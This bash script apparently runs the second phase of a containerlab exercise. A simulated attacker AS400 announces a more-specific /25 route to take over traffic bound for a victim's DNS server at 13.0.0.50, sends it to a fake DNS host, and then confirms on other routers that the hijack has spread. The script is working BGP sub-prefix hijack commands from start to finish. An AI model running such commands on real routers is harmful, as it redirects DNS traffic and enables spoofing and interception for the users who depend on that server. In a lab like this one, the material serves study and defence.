#!/bin/bash
echo "=== Phase 2: Launching Sub-Prefix Hijack on DNS Server ==="
echo ""
echo "[1] AS400 (Attacker) announcing 13.0.0.0/25 (sub-prefix of victim's /24)..."
echo "    This covers the DNS server at 13.0.0.50"
echo ""

# Add static route on R4 so hijacked traffic reaches fake-dns
docker exec clab-bgp-dns-hijack-r4 vtysh -c "configure terminal" \
  -c "ip route 13.0.0.0/25 10.40.0.2" \
  -c "router bgp 400" \
  -c "address-family ipv4 unicast" \
  -c "network 13.0.0.0/25" \
  -c "end"

echo "[2] Waiting 10s for BGP convergence..."
sleep 10

echo "[3] Verifying hijack propagation on R2 (Transit):"
docker exec clab-bgp-dns-hijack-r2 vtysh -c "show bgp ipv4 unicast 13.0.0.0/25"

echo ""
echo "[4] Verifying hijack propagation on R6 (Client's AS):"
docker exec clab-bgp-dns-hijack-r6 vtysh -c "show bgp ipv4 unicast 13.0.0.0/25"

echo ""
echo "=== Sub-Prefix Hijack Active ==="
echo "    DNS queries to 13.0.0.50 now route to AS400 (attacker)"
